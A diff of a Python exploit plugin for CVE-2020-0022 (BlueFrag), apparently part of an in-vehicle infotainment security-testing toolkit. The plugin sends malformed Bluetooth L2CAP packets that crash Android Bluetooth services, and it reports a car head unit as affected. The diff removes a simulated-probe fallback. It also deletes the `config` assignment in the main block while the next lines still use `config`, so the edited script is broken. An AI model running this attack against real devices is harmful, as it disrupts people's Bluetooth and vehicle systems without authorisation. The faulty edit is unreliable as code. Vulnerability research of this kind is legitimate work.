@@ -1,3 +1,14 @@
+"""
+PoC Name: BlueFrag Bluetooth L2CAP DoS (CVE-2020-0022)
+CVE: CVE-2020-0022
+Component: Wireless Stack
+Category: Wireless
+Severity: High
+CVSS: 8.0
+Description: Android 8.0–9.0 蓝牙栈 Bluedroid L2CAP 层堆溢出，发送畸形 L2CAP 包可导致蓝牙服务崩溃重启。杭州 CCF 中实测奔腾车机有此漏洞
+Prerequisites: 兼容易受控使用的Linux蓝牙适配器(如hci0)
+Usage: python3 46_BT_CVE_2020_0022_DoS.py <args>
+"""
 import socket
 import sys
 import time
@@ -14,7 +25,7 @@ class BlueFrag2020DoSPlugin(IVIVulnerabilityPlugin):
     数据包时存在堆溢出漏洞。攻击者无需配对即可向目标发送畸形 L2CAP 数据包，
     导致蓝牙守护进程崩溃重启（蓝牙短暂不可用）。
     
-    在 2025.8 杭州 CCF 中，奔腾车机蓝牙被实测触发崩溃重启（WP-IVI-10）。
+    奔腾车机蓝牙被实测触发崩溃重启（WP-IVI-10）。
     
     检测逻辑:
     1. 建立基准 L2CAP 连接（SDP 查询），确认目标可达
@@ -50,9 +61,8 @@ class BlueFrag2020DoSPlugin(IVIVulnerabilityPlugin):
             self.logger.info("AF_BLUETOOTH 可用，蓝牙检测环境就绪。")
             return True
         except (AttributeError, OSError) as e:
-            self.logger.warning(f"AF_BLUETOOTH 不可用（可能在 macOS 上），将改用模拟探测: {e}")
-            self.use_simulated = True
-            return True
+            self.logger.warning(f"环境限制：当前操作系统内核不支持原生 AF_BLUETOOTH (如 macOS)，不可执行真实 L2CAP 发包: {e}")
+            return False
 
     def _check_bt_reachable(self, timeout=4):
         """尝试建立 L2CAP 连接到 SDP 端口（PSM=1），返回是否成功"""
@@ -94,16 +104,6 @@ class BlueFrag2020DoSPlugin(IVIVulnerabilityPlugin):
     def exploit(self):
         mac = self.target_mac
 
-        # 如果在非 Linux 环境，进行模拟探测
-        if getattr(self, "use_simulated", False):
-            self.logger.info("[模拟模式] 当前系统不支持原生 AF_BLUETOOTH，执行模拟探测。")
-            self.results["vulnerable"] = False
-            self.results["evidence"] = (
-                "当前运行环境（macOS）不支持原生蓝牙 L2CAP socket，"
-                "无法执行真实 CVE-2020-0022 探测。请在 Linux 环境中运行。"
-            )
-            return
-
         self.logger.info(f"[1/3] 检测目标蓝牙可达性: {mac}")
         reachable_before = self._check_bt_reachable(timeout=5)
         if not reachable_before:
@@ -141,9 +141,7 @@ class BlueFrag2020DoSPlugin(IVIVulnerabilityPlugin):
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
-        print("用法: python3 63_BT_CVE_2020_0022_DoS.py <bluetooth_mac>")
-        print("示例: python3 63_BT_CVE_2020_0022_DoS.py AA:BB:CC:DD:EE:FF")
+        print("Usage: python3 46_BT_CVE_2020_0022_DoS.py <args>")
         sys.exit(1)
-    config = {"bluetooth_mac": sys.argv[1]}
     plugin = BlueFrag2020DoSPlugin(config)
     plugin.run_verify()
